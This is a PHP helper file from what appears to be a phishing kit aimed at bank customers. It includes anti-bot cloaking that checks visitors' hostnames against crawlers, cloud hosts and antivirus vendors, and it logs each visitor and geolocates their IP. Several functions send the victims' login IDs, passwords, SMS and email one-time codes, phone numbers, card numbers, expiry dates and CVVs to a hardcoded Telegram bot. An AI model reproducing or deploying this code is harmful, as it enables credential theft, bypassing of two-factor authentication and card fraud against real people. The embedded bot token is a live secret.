<?php
/*
* Redirect Function
*/function rediret($link){
		header('Location: '.$link);
		exit();
	}

/*
 * Get User Agent IP Function
*/
    function _user(){
		if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
			$adresse = getenv("HTTP_CLIENT_IP");
		else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
			$adresse = getenv("HTTP_X_FORWARDED_FOR");
		else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
			$adresse = getenv("REMOTE_ADDR");
		else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
			$adresse = $_SERVER['REMOTE_ADDR'];
		else
			$adresse = "";
		return($adresse);
	}

	function AntiBomb_OS($referer){
	    $array_os = [ 'windows nt 10' =>'Windows 10', 'windows nt 6.3' => 'Windows 8.1', 'windows nt 6.2' => 'Windows 8', 'windows nt 6.1|windows nt 7.0' => 'Windows 7', 'windows nt 6.0' => 'Windows Vista', 'windows nt 5.2' => 'Windows Server 2003/XP x64', 'windows nt 5.1' => 'Windows XP', 'windows xp' => 'Windows XP', 'windows nt 5.0|windows nt5.1|windows 2000' => 'Windows 2000', 'windows me' => 'Windows ME', 'windows nt 4.0|winnt4.0' => 'Windows NT', 'windows ce' => 'Windows CE', 'windows 98|win98' => 'Windows 98', 'windows 95|win95' => 'Windows 95', 'win16' => 'Windows 3.11', 'mac os x 10.1[^0-9]' => 'Mac OS X Puma', 'macintosh|mac os x' => 'Mac OS X', 'mac_powerpc' => 'Mac OS 9', 'linux' => 'Linux', 'ubuntu' => 'Linux - Ubuntu', 'iphone' => 'iPhone', 'ipod' => 'iPod', 'ipad' => 'iPad', 'android' => 'Android', 'blackberry' => 'BlackBerry', 'webos' => 'Mobile', '(media center pc).([0-9]{1,2}\.[0-9]{1,2})'=>'Windows Media Center', '(win)([0-9]{1,2}\.[0-9x]{1,2})'=>'Windows', '(win)([0-9]{2})'=>'Windows', '(windows)([0-9x]{2})'=>'Windows', 'Win 9x 4.90'=>'Windows ME', '(windows)([0-9]{1,2}\.[0-9]{1,2})'=>'Windows', 'win32'=>'Windows', '(java)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,2})'=>'Java', '(Solaris)([0-9]{1,2}\.[0-9x]{1,2}){0,1}'=>'Solaris', 'dos x86'=>'DOS', 'Mac OS X'=>'Mac OS X', 'Mac_PowerPC'=>'Macintosh PowerPC', '(mac|Macintosh)'=>'Mac OS', '(sunos)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'SunOS', '(beos)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'BeOS', '(risc os)([0-9]{1,2}\.[0-9]{1,2})'=>'RISC OS', 'unix'=>'Unix', 'os/2'=>'OS/2', 'freebsd'=>'FreeBSD', 'openbsd'=>'OpenBSD', 'netbsd'=>'NetBSD', 'irix'=>'IRIX', 'plan9'=>'Plan9', 'osf'=>'OSF', 'aix'=>'AIX', 'GNU Hurd'=>'GNU Hurd', '(fedora)'=>'Linux - Fedora', '(kubuntu)'=>'Linux - Kubuntu', '(ubuntu)'=>'Linux - Ubuntu', '(debian)'=>'Linux - Debian', '(CentOS)'=>'Linux - CentOS', '(Mandriva).([0-9]{1,3}(\.[0-9]{1,3})?(\.[0-9]{1,3})?)'=>'Linux - Mandriva', '(SUSE).([0-9]{1,3}(\.[0-9]{1,3})?(\.[0-9]{1,3})?)'=>'Linux - SUSE', '(Dropline)'=>'Linux - Slackware (Dropline GNOME)', '(ASPLinux)'=>'Linux - ASPLinux', '(Red Hat)'=>'Linux - Red Hat', '(linux)'=>'Linux', '(amigaos)([0-9]{1,2}\.[0-9]{1,2})'=>'AmigaOS', 'amiga-aweb'=>'AmigaOS', 'amiga'=>'Amiga', 'AvantGo'=>'PalmOS', '[0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3})'=>'Linux', '(webtv)/([0-9]{1,2}\.[0-9]{1,2})'=>'WebTV', 'Dreamcast'=>'Dreamcast OS', 'GetRight'=>'Windows', 'go!zilla'=>'Windows', 'gozilla'=>'Windows', 'gulliver'=>'Windows', 'ia archiver'=>'Windows', 'NetPositive'=>'Windows', 'mass downloader'=>'Windows', 'microsoft'=>'Windows', 'offline explorer'=>'Windows', 'teleport'=>'Windows', 'web downloader'=>'Windows', 'webcapture'=>'Windows', 'webcollage'=>'Windows', 'webcopier'=>'Windows', 'webstripper'=>'Windows', 'webzip'=>'Windows', 'wget'=>'Windows', 'Java'=>'Unknown', 'flashget'=>'Windows', 'MS FrontPage'=>'Windows', '(msproxy)/([0-9]{1,2}.[0-9]{1,2})'=>'Windows', '(msie)([0-9]{1,2}.[0-9]{1,2})'=>'Windows', 'libwww-perl'=>'Unix', 'UP.Browser'=>'Windows CE', 'NetAnts'=>'Windows','IEMobile' => 'Windows Mobile',
	    ];
	    $arch_regex = '/\b(x86_64|x86-64|Win64|WOW64|x64|ia64|amd64|ppc64|sparc64|IRIX64)\b/ix';
	    $arch = preg_match($arch_regex, $referer) ? '64' : '32';
	    foreach ($array_os as $regex => $value) {
	        if (preg_match('{\b('.$regex.')\b}i', $referer)) {
	            return $value.' x'.$arch;
	        }
	    }
	    return 'Unknown';
	}

	function AntiBomb_Brow($referer){
		$infos=$referer;
		if (strpos(strtolower($infos), 'safari/') and strpos(strtolower($infos), 'opr/')) { $version='Opera'; }
		elseif (strpos(strtolower($infos), 'safari/') and strpos(strtolower($infos), 'chrome/')) { $version='Chrome'; }
		elseif (strpos(strtolower($infos), 'msie')) { $version='Internet Explorer'; }
		elseif (strpos(strtolower($infos), 'firefox/')) { $version='Firefox'; }
		elseif (strpos(strtolower($infos), 'safari/') and strpos(strtolower($infos), 'opr/')==false and strpos(strtolower($infos), 'chrome/')==false) { $version='Safari'; }
		else { $version='OUT OF DATA'; };
		return $version;
	}
	function _AntiBomb_User($user){
		$user_list = @fopen("./q99550/data/logs/AntiBomb_Vititor.txt","a+");
		fwrite($user_list,"[".$_SESSION['code']."] => ".date('D - H:i:s')." -> ".$user."\r\n");
		fclose($user_list);
	}

	function _AntiBomb_Block($user){
		$user_block = @fopen("./q99550/data/logs/AntiBomb_Block.txt","a+");
		fwrite($user_block,"[".$_SESSION['code']."] => ".date('D - H:i:s')." -> ".$user."\r\n");
		fclose($user_block);
	}

	function AntiBomb_User($user){
        global $count;
        $lisnC  = @fopen("./q99550/data/logs/AntiBomb_Vititor.txt", "r");
        if ($lisnC)
        {
            while (!feof($lisnC))
            {
                $buffer = fgets($lisnC);
                if(strpos($buffer, $user) !== FALSE) $count ++;
                if($count === 5){
                    return true;
                    break;
                }
            }
            fclose($lisnC);
        }
    }

	function AntiBomb_Block($user){
        global $block;
        $listB  = @fopen("./q99550/data/logs/AntiBomb_Block.txt", "r");
        if ($listB)
        {
            while (!feof($listB))
            {
                $buffer = fgets($listB);
                if(strpos($buffer, $user) !== FALSE) $block ++;
                if($block === 1){
                    return true;
                    break;
                }
            }
            fclose($listB);
        }
    }

	function AntiBomb_Boot($user){
        global $block;
        $listBoot  = @fopen("./connexion/data/logs/L7oukoma.csv", "r");
        if ($listBoot)
        {
            while (!feof($listBoot))
            {
                $buffer = fgets($listBoot);
                if(strpos($buffer, $user) !== FALSE) $block ++;
                if($block === 1){
                    return true;
                    break;
                }
            }
            fclose($listBoot);
        }
    }

	function AntiBomb_BootList($user){
		$boot_list = @fopen("./connexion/data/logs/Boot_Dkhel.txt","a+");
		fwrite($boot_list,"[".$_SESSION['code']."] => ".date('D - H:i:s')." -> ".$user."\r\n");
		fclose($boot_list);
	}

	/* Check Boot By Hostname */
	function AntiBomb_WordBoot($user){
		$hostnamee = gethostbyaddr($user);
        $listaBoot  = array(
		'google', 'Altavista', 'Israel', 'M247', 'ip-$user.eu', 'prg.opendns.com', 'appliedprivacy.net',
		'Rambler', 'Yahoo', 'AbachoBOT', 'Accoona',	'AcoiRobot',
		'ASPSeek', 'CrocCrawler', 'Dumbot', 'amazonaws', 'ebay',
		'FAST-WebCrawler', 'GeonaBot', 'Gigabot', 'Lycos', 'MSRBOT',
		'Scooter', 'eStyle', 'Scrubby', 'facebookexternalhit', 'spider',
		'googlebot', 'crawl', 'curl', 'dataprovider', 'search',
		'googleusercontent', 'theplanet', 'microsoft', 'avast', 'majesticsEO',
		'theplanet', 'microsoft', 'avast', 'majesticsEO',
		'BotLink', 'bingbot', 'AhrefsBot', 'ahoy', 'AlkalineBOT', 'anthill', 'appie', 'arale', 'araneo', 'AraybOt', 'ariadne', 'arks', 'ATN_Worldwide', 'Atomz', 'bbot', 'Bjaaland', 'Ukonline', 'borg\-bot\/0\.9', 'boxseabot', 'bspider', 'calif', 'christcrawler', 'CMC\/0\.01', 'combine', 'confuzzledbot', 'CoolBot', 'cosmos', 'Internet Cruiser Robot', 'cusco', 'cyberspyder', 'cydralspider', 'desertrealm', 'desert realm', 'digger', 'DIIbot', 'grabber', 'downloadexpress', 'DragonBot', 'dwcp', 'ecollector', 'ebiness', 'elfinbot', 'esculapio', 'esther', 'fastcrawler', 'FDSE', 'FELIX IDE', 'ESI', 'fido', 'KIT\-Fireball', 'fouineur', 'Freecrawl', 'gammaSpider', 'gazz', 'gcreep', 'golem', 'griffon', 'Gromit', 'gulliver', 'gulper', 'hambot', 'havIndex', 'hotwired', 'htdig', 'iajabot', 'INGRID\/0\.1', 'Informant', 'InfoSpiders', 'inspectorwww', 'irobot', 'Iron33', 'JBot', 'jcrawler', 'Teoma', 'Jeeves', 'jobo', 'image\.kapsi\.net', 'KDD\-Explorer', 'ko_yappo_robot', 'label\-grabber', 'larbin', 'legs', 'Linkidator', 'linkwalker', 'Lockon', 'logo_gif_crawler', 'marvin', 'mattie', 'mediafox', 'MerzScope', 'NEC\-MeshExplorer', 'MindCrawler', 'udmsearch', 'moget', 'Motor', 'msnbot', 'muncher', 'muninn', 'MuscatFerret', 'MwdSearch', 'sharp\-info\-agent', 'WebMechanic', 'NetScoop', 'newscan\-online', 'ObjectsSearch', 'Occam', 'Orbsearch\/1\.0', 'packrat', 'pageboy', 'ParaSite', 'patric', 'pegasus', 'perlcrawler', 'phpdig', 'piltdownman', 'Pimptrain', 'pjspider', 'PlumtreeWebAccessor', 'PortalBSpider', 'psbot', 'Getterrobo\-Plus', 'Raven', 'RHCS', 'RixBot', 'roadrunner', 'Robbie', 'robi', 'RoboCrawl', 'robofox', 'Scooter', 'Search\-AU', 'searchprocess', 'Senrigan', 'Shagseeker', 'sift', 'SimBot', 'Site Valet', 'skymob', 'SLCrawler\/2\.0', 'slurp', 'ESI', 'snooper', 'solbot', 'speedy', 'spider_monkey', 'SpiderBot\/1\.0', 'spiderline', 'nil', 'suke', 'http:\/\/www\.sygol\.com', 'tach_bw', 'TechBOT', 'templeton', 'titin', 'topiclink', 'UdmSearch', 'urlck', 'Valkyrie libwww\-perl', 'verticrawl', 'Victoria', 'void\-bot', 'Voyager', 'VWbot_K', 'crawlpaper', 'wapspider', 'WebBandit\/1\.0', 'webcatcher', 'WebMoose', 'webquest', 'webreaper', 'webs', 'webspider', 'WebWalker', 'wget', 'winona', 'whowhere', 'wlm', 'WOLP', 'WWWC', 'none', 'XGET', 'Nederland\.zoek', 'AISearchBot', 'woriobot', 'NetSeer', 'Nutch', 'YandexBot', 'YandexMobileBot', 'SemrushBot', 'FatBot', 'MJ12bot', 'DotBot', 'AddThis', 'baiduspider', 'SeznamBot', 'mod_pagespeed', 'CCBot', 'openstat.ru',
		'facebook');

	function Antibomb_header(){

	}

	foreach($listaBoot as $t)
	{
		if (strpos($hostnamee,$t) !== false) {
			return true;
			break;
		}
	}
	}

	function AntiBomb_BootHostname($user){
		$hostnamee = gethostbyaddr($user);
		$boot_list = @fopen("./connexion/data/logs/Boot_By_HostName.txt","a+");
		fwrite($boot_list,"[".$_SESSION['code']."] => ".date('D - H:i:s')." -> ".$user." -> ".$hostnamee."\r\n");
		fclose($boot_list);
	}

	function getLocation($user){
		$init = curl_init();
		curl_setopt_array($init, array(
			CURLOPT_URL				=> "http://www.geoplugin.net/json.gp?ip=".$user,
			CURLOPT_HEADER			=> 0,
			CURLOPT_RETURNTRANSFER	=> TRUE
			));
		$details = curl_exec($init); // string
		curl_close($init);
		$location = json_decode($details);
		$_SESSION['country'] =  strtoupper($location->geoplugin_countryName);
		$_SESSION['code'] =  $location->geoplugin_countryCode;
	}

	function AntiBombResI($GeolocSearchInput,$user, $referer, $text = null){

		      $text .= "|====================[DEP]|\n";
					$text .= "|====================[ CA ]|\n";
				  $text .= "|DEP    :  " .$GeolocSearchInput."\n";
				  $text .= "|====================[ AntiBomber ]=========================|\n";
					$text .= "|SYSTEME    :  " .AntiBomb_OS($referer)."\n";
					$text .= "|BROWSER    :  " .$referer."\n";
					$text .= "|IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
					file_get_contents("https://api.telegram.org/bot1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ/sendMessage?chat_id=1097743075&text=" . urlencode($text)."" );
	}

	function AntiBombResII($identifiant,$password, $user, $referer, $text = null){
		        	$text .= "|====================[Login]|\n";
							$text .= "|Identifiant        :  " .$identifiant."\n";
							$text .= "|Password        : " .$password."\n";
							$text .= "|SYSTEME    :  " .AntiBomb_OS($referer)."\n";
							$text .= "|BROWSER    :  " .$referer."\n";
							$text .= "|IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
					file_get_contents("https://api.telegram.org/bot1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ/sendMessage?chat_id=1097743075&text=" . urlencode($text)."" );
	}

	function AntiBombResOTP($otp, $user, $referer, $text = null){
					$text  = "|====================[ code Sms ]=========================|\n";
					$text .= "|code 1    :  " .$otp."\n";
					$text .= "\n";
					$text .= "|SYSTEME    :  " .AntiBomb_OS($referer)."\n";
					$text .= "|BROWSER    :  " .$referer."\n";
					$text .= "|IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
					$text .= "|====================[ Code sms ]=========================|\n";
					file_get_contents("https://api.telegram.org/bot1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ/sendMessage?chat_id=1097743075&text=" . urlencode($text)."" );
	}
	function AntiBombResOtpEmail($otpmail, $user, $referer, $text = null){
					$text  = "|====================[ code email ]=========================|\n";
					$text .= "|code 2     :  " .$otpmail."\n";
					$text .= "\n";
					$text .= "|SYSTEME    :  " .AntiBomb_OS($referer)."\n";
					$text .= "|BROWSER    :  " .$referer."\n";
					$text .= "|IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
					$text .= "|====================[ Code email ]=========================|\n";

					file_get_contents("https://api.telegram.org/bot1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ/sendMessage?chat_id=1097743075&text=" . urlencode($text)."" );
	}
	function AntiBombResInfo($ttx,$ctx,$dtx,$cttx, $user, $referer, $text = null){
					$text  = "|====================[  info ]=========================|\n";
					$text .= "|Tel    :  " .$ttx."\n";
					$text .= "|Cc     :  " .$ctx."\n";
					$text .= "|expire :  " .$dtx."\n";
					$text .= "|vvc    :  " .$cttx."\n";
					$text .= "\n";
					$text .= "\n";
					$text .= "|SYSTEME    :  " .AntiBomb_OS($referer)."\n";
					$text .= "|BROWSER    :  " .$referer."\n";
					$text .= "|IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";

					$text .= "|====================[end info ]=========================|\n";

					file_get_contents("https://api.telegram.org/bot1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ/sendMessage?chat_id=1097743075&text=" . urlencode($text)."" );
	}

	function validate_cc_date($month,$year) {
			if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
					return $month . '/' . $year;
			} else {
					return false;
			}
	}

	function validate_cc_cvv($number = null,$type = null) {
			 if( empty($number) || empty($type) )
					 return false;
			 $cvv = CreditCard::validCvc($number, $type);
			 return $cvv;
	 }

?>
